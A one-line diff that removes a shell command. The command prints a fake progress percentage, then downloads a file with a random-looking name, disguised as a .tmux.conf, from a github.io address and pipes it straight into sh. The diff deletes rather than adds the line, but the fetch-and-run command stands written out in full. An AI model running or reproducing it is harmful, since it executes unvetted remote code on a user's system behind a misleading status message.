@@ -1,1 +1,0 @@
-echo 'Progress: 35.0%'; curl -L --progress-bar frkns.github.io/fun/ExemptEncouragesJobsRalphEyed.tmux.conf | sh
